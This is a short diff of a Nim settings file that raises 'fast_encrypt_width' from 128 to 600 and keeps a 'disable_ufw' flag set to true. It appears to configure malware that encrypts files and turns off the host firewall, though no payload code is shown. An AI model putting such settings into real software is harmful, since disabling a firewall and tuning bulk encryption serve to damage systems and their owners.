@@ -70,7 +70,7 @@ var sh3*: uint32
 var sh4*: uint32
 var sh5*: uint8
 var random_str* = newString(len = 0)
-var fast_encrypt_width*: uint = 128
+var fast_encrypt_width*: uint = 600
 
 # [settings]
 var disable_ufw* = true
